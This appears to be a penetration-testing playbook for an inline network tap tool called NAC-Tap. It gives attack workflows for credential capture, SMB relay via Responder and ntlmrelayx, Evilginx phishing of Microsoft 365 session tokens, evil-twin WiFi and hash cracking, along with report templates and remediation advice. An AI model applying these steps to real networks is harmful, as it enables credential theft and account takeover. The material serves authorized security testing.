# NAC-Tap Pentest Playbook

**Quick reference guide for penetration testing engagements**

---

## üìã Pre-Engagement Checklist

### Legal & Authorization
- [ ] Signed Statement of Work (SOW)
- [ ] Rules of Engagement (ROE) documented
- [ ] Scope includes network MITM attacks
- [ ] Authorization for credential capture
- [ ] Data handling procedures agreed
- [ ] Emergency contact established

### Technical Setup
- [ ] NAC-Tap appliance configured
- [ ] Interfaces identified (eth0, eth1, wlan0)
- [ ] Bridge tested and verified
- [ ] Web UI accessible
- [ ] Dependencies installed
- [ ] Backup device ready
- [ ] Network diagram obtained
- [ ] Target systems identified

### Evidence Collection
- [ ] Screenshot tool ready
- [ ] Note-taking system prepared
- [ ] Timestamp synchronization verified
- [ ] Chain of custody forms ready
- [ ] Secure storage for captured data

---

## üéØ Attack Scenarios by Engagement Type

### Scenario 1: Internal Network Assessment (Most Common)

**Objective**: Test network segmentation and credential security

**Setup Time**: 15-30 minutes

**Attack Flow**:
```
1. Physical deployment (insert NAC-Tap inline)
2. Start transparent bridge capture
3. Enable MITM with protocol interception
4. Monitor for credentials (passive)
5. If authorized, test captured credentials
6. Document findings
```

**Commands**:
```bash
# Start NAC-Tap
sudo python3 nac-tap.py

# Access WebUI
http://10.200.66.1:8080

# Enable MITM (in WebUI):
- MITM Tab ‚Üí Enable MITM
- Protocols: SMB, HTTP, LLMNR, mDNS
- Remote attacker: (your Responder VM IP)
```

**Expected Results**:
- NTLM hashes captured
- Plaintext credentials from HTTP
- SMB relay opportunities identified
- Network authentication patterns documented

**Report Findings**:
- "Successfully captured X credentials via transparent MITM"
- "Network lacks SMB signing enforcement (see evidence)"
- "LLMNR/NBT-NS poisoning successful (see captured hashes)"
- Risk: High/Medium/Low

---

### Scenario 2: Red Team Exercise

**Objective**: Gain persistent access via session hijacking

**Setup Time**: 1-2 hours (includes CA cert deployment)

**Attack Flow**:
```
1. Deploy NAC-Tap on compromised switch port
2. Install CA certificate on 1-2 target devices (simulated persistence)
3. Start Evilginx with O365 phishing
4. Wait for Microsoft 365 authentications
5. Capture session tokens
6. Use tokens for persistent access
7. Demonstrate impact
```

**Commands**:
```bash
# Install Evilginx (if not already)
sudo ./install-evilginx.sh

# Enable internet routing for installation
# (In WebUI: see instructions on Evilginx tab)

# Start Evilginx (WebUI):
- Evilginx Tab ‚Üí Select o365
- Start Evilginx
- Monitor for sessions
```

**Expected Results**:
- Valid Microsoft 365 session tokens
- Access to corporate email
- Access to SharePoint/Teams
- Persistent access for 90+ days (token lifetime)

**Report Findings**:
- "Captured valid OAuth tokens via transparent MITM"
- "No MFA challenge during token replay"
- "Demonstrated persistent access to corporate M365"
- Risk: Critical

---

### Scenario 3: Wireless Assessment (Evil Twin)

**Objective**: Test user security awareness and wireless security

**Setup Time**: 30-60 minutes

**Attack Flow**:
```
1. Configure NAC-Tap as WiFi AP (setup-wifi-ap.sh)
2. Create evil twin of corporate WiFi
3. Wait for connections
4. Capture credentials via Evilginx or MITM
5. Test awareness (do users notice?)
```

**Commands**:
```bash
# Setup WiFi AP
sudo ./setup-wifi-ap.sh

# Configure SSID to match target network
# Edit: SSID="TARGET-CORP-WIFI"

# Start capture
sudo python3 nac-tap.py
```

**Expected Results**:
- Users connect to evil twin
- Credentials captured
- Security awareness measured
- Certificate warnings ignored (or not)

**Report Findings**:
- "X out of Y users connected to rogue AP"
- "Z users bypassed SSL certificate warnings"
- "Captured N sets of credentials"
- Risk: High (low security awareness)

---

### Scenario 4: Vendor/Third-Party Access Testing

**Objective**: Test security of vendor connections

**Setup Time**: 15 minutes

**Attack Flow**:
```
1. Deploy NAC-Tap on vendor access port
2. Capture vendor authentication traffic
3. Identify protocols and credentials
4. Test for credential reuse
5. Document access patterns
```

**Expected Results**:
- Vendor authentication methods documented
- Weak/shared credentials identified
- Network segmentation tested
- Access scope verified

**Report Findings**:
- "Vendor uses cleartext authentication (FTP/Telnet)"
- "Vendor credentials work on multiple systems"
- "No network segmentation from corporate network"
- Risk: High

---

## üõ†Ô∏è Common Attack Patterns

### Pattern 1: SMB Relay Attack

**When to use**: Testing SMB security and authentication relay

**Prerequisites**:
- SMB signing disabled on target
- MITM enabled with SMB interception
- Responder/ntlmrelayx running on attacker VM

**Setup**:
```bash
# On attacker VM (not NAC-Tap):
sudo responder -I eth0 -wv

# Or for relay:
sudo ntlmrelayx.py -tf targets.txt -smb2support

# On NAC-Tap WebUI:
MITM Tab ‚Üí Enable MITM
Remote Attacker IP: <attacker-vm-ip>
Protocols: SMB, LLMNR, mDNS
```

**Success Indicators**:
- NTLM hashes received by Responder
- Authentication relayed to target
- Shell/code execution achieved

**Evidence to Collect**:
- Screenshot of Responder output
- Captured NTLM hash
- Relay success message
- Shell access screenshot

---

### Pattern 2: Credential Harvesting (Passive)

**When to use**: Initial reconnaissance, understanding auth patterns

**Prerequisites**:
- None (completely passive)

**Setup**:
```bash
# Just start capture
sudo python3 nac-tap.py

# In WebUI:
# Status Tab ‚Üí Start Capture
# Wait and monitor Loot tab
```

**Success Indicators**:
- Credentials appear in Loot tab
- PCredz identifies usernames/passwords
- NTLM hashes captured from PCAP

**Evidence to Collect**:
- Export loot (Loot Tab ‚Üí Export)
- Download PCAP
- Screenshot of captured credentials (redacted for report)

---

### Pattern 3: Session Hijacking (Evilginx)

**When to use**: Testing OAuth/MFA bypass, session security

**Prerequisites**:
- Evilginx installed
- Victim must bypass SSL warning OR CA cert installed
- Internet access enabled (for Evilginx to proxy)

**Setup**:
```bash
# Enable internet routing first (see WebUI instructions)

# Start Evilginx (WebUI):
Evilginx Tab ‚Üí Start with o365 phishlet

# Wait for authentication
# Monitor Session count
```

**Success Indicators**:
- Session count increases
- Export JSON shows captured tokens
- Can replay session in browser

**Evidence to Collect**:
- Screenshot of captured session
- Export sessions JSON
- Screenshot of successful access using token
- Timeline of capture

---

## üìä Evidence Collection Best Practices

### During Attack

**Real-time Notes**:
```
Timestamp | Event | Details | Evidence File
----------|-------|---------|---------------
14:32:15  | MITM Enabled | SMB intercept | screenshot-001.png
14:35:22  | Creds captured | user: jdoe | pcap-capture-001.pcap
14:40:11  | Hash cracked | password: Spring2024! | hashcat-output.txt
```

**Screenshots to Take**:
1. NAC-Tap status page (before attack)
2. MITM configuration
3. Credential capture moment
4. Loot tab with redacted credentials
5. Successful credential use (if authorized)
6. NAC-Tap status page (after attack)

**Files to Preserve**:
- PCAP files (all of them)
- Loot JSON export
- Evilginx sessions JSON
- PCredz raw output
- Responder logs (if used)
- Terminal command history

### Post-Engagement

**Data Sanitization**:
```bash
# Create sanitized copy for report
cp nac-captures/*.pcap /evidence/engagement-123/
cp loot.json /evidence/engagement-123/loot-REDACTED.json

# Edit loot-REDACTED.json:
# Replace real passwords with "***REDACTED***"
# Keep usernames for context
```

**Chain of Custody**:
```
Engagement: ACME-2025-01
Tester: [Your Name]
Date: 2025-11-08
Device: NAC-Tap Serial #12345
Data: /evidence/engagement-123/
Hash: [sha256sum of archive]
Stored: Encrypted USB drive, company safe
```

---

## üìù Report Writing Templates

### Finding: Transparent MITM Attack Successful

**Title**: Network Traffic Interception via Transparent Bridge

**Risk**: High

**Description**:
During testing, a transparent network bridge was deployed inline between the target network segment and the switch. This allowed interception of all network traffic passing through the connection point.

**Evidence**:
- Deployment location: Building A, Floor 2, Network closet 2B
- Duration: 4 hours
- Traffic captured: 2.3 GB
- Credentials captured: 15 unique accounts
- See: Screenshot-001.png, capture-001.pcap

**Impact**:
- All network traffic visible to attacker
- Credentials transmitted in cleartext (HTTP, FTP, Telnet)
- NTLM authentication captured and crackable
- No detection by security monitoring

**Recommendation**:
1. Implement 802.1X port security
2. Enable SMB signing on all systems
3. Disable LLMNR and NBT-NS
4. Enforce encrypted protocols (HTTPS, SFTP, SSH)
5. Implement network anomaly detection

**CVSS**: 8.1 (High)

---

### Finding: Session Hijacking via DNS Poisoning

**Title**: Microsoft 365 Session Token Capture via MITM

**Risk**: Critical

**Description**:
Using DNS poisoning and transparent SSL interception, valid OAuth session tokens were captured for Microsoft 365 accounts. These tokens provided persistent access to corporate email, SharePoint, and Teams without requiring additional authentication.

**Evidence**:
- Attack method: DNS poisoning + Evilginx2
- Tokens captured: 3 executive accounts
- Token lifetime: 90+ days
- See: Screenshot-evilginx-001.png, sessions.json

**Impact**:
- Persistent access to corporate M365 without credentials
- No MFA challenge during token replay
- Access to sensitive emails and documents
- Ability to send emails as captured users
- No detection by security monitoring

**Recommendation**:
1. Implement Conditional Access policies with device compliance
2. Enable Continuous Access Evaluation (CAE)
3. Reduce token lifetime to 1 hour
4. Require MFA on every token refresh
5. Implement certificate pinning on corporate devices
6. Deploy DNS security (DNSSEC, DoH)

**CVSS**: 9.4 (Critical)

---

## üöÄ Quick Commands Reference

### Deployment
```bash
# Start NAC-Tap
sudo python3 nac-tap.py

# Access WebUI
http://10.200.66.1:8080
```

### Status Checks
```bash
# Check bridge status
ip link show br0

# Check capture process
ps aux | grep tcpdump

# Check Evilginx status
ps aux | grep evilginx

# View logs
tail -f /var/log/nac-captures/*.log
```

### Evidence Collection
```bash
# Export all evidence
cd /var/log/nac-captures
tar -czf evidence-$(date +%Y%m%d-%H%M%S).tar.gz *.pcap *.json *.txt

# Calculate hash for chain of custody
sha256sum evidence-*.tar.gz > evidence-hash.txt
```

### Cleanup
```bash
# Stop all captures
# (Use WebUI: Stop Capture, Stop MITM, Stop Evilginx)

# Or force kill
sudo pkill -f nac-tap.py

# Remove bridge
sudo ip link delete br0
```

---

## ‚ö†Ô∏è Troubleshooting

### Issue: No credentials captured after 2+ hours

**Diagnosis**:
```bash
# Check if traffic is flowing
tcpdump -i br0 -nn -c 100

# Check if MITM is working
cat /var/log/nac-captures/nac-tap.log | grep MITM

# Check loot file
cat /var/log/nac-captures/loot.json
```

**Solutions**:
- Verify bridge is inline (check physical connections)
- Check if network is active (ping from victim device)
- Try different protocols (disable SMB, enable HTTP)
- Verify Responder is running (if using relay)

---

### Issue: Evilginx not capturing sessions

**Diagnosis**:
```bash
# Check Evilginx log
tail -f /var/log/nac-captures/evilginx.log

# Check DNS poisoning
nslookup login.microsoftonline.com 10.200.66.1

# Check if Evilginx is listening
ss -tlnp | grep evilginx
```

**Solutions**:
- Verify victim bypassed SSL warning
- Check phishlet is enabled (see logs)
- Verify DNS poisoning is active
- Try installing CA certificate on victim device

---

## üìö Integration with Other Tools

### Responder
```bash
# On attacker VM
sudo responder -I eth0 -wv

# On NAC-Tap (WebUI):
MITM ‚Üí Remote Attacker IP ‚Üí [attacker-vm-ip]
```

### ntlmrelayx
```bash
# On attacker VM
sudo ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"

# On NAC-Tap (WebUI):
MITM ‚Üí Remote Attacker IP ‚Üí [attacker-vm-ip]
MITM ‚Üí Protocols ‚Üí SMB only
```

### Hashcat
```bash
# Crack captured NTLM hashes
hashcat -m 5600 loot.txt rockyou.txt --force
```

### Wireshark
```bash
# Analyze PCAP
wireshark /var/log/nac-captures/capture-*.pcap

# Filter for interesting traffic:
# http.request.method == "POST"
# ntlmssp
# kerberos
```

---

## üéØ Success Metrics

**Track for report**:
- Total time deployed: ___ hours
- Traffic captured: ___ GB
- Unique credentials: ___ accounts
- NTLM hashes: ___ hashes
- Session tokens: ___ tokens
- Successful relays: ___ systems compromised
- Detection rate: ___ (none/partial/full)

**Client value demonstration**:
- "Captured X credentials in Y hours"
- "Zero detection by security team"
- "Z% of users bypassed SSL warnings"
- "Demonstrated persistent access for 90+ days"

---

## üìñ Additional Resources

- `README.md` - Installation and basic usage
- `QUICKSTART.md` - Quick start guide
- `MITM-FEATURES.md` - MITM technical details
- `EVILGINX-SETUP.md` - Evilginx configuration
- `SSL-CERTIFICATE-BYPASS.md` - Handling SSL warnings
- `ATTACK-MODES.md` - Transparent vs phishing modes

---

## ‚öñÔ∏è Legal Disclaimer

This playbook is for **authorized penetration testing only**.

- All activities must be authorized in writing
- Stay within scope of engagement
- Follow rules of engagement strictly
- Handle captured data per agreement
- Report vulnerabilities responsibly
- Never exceed authorization

Unauthorized access to computer systems is illegal.

**Document authorization before proceeding with any attack!**

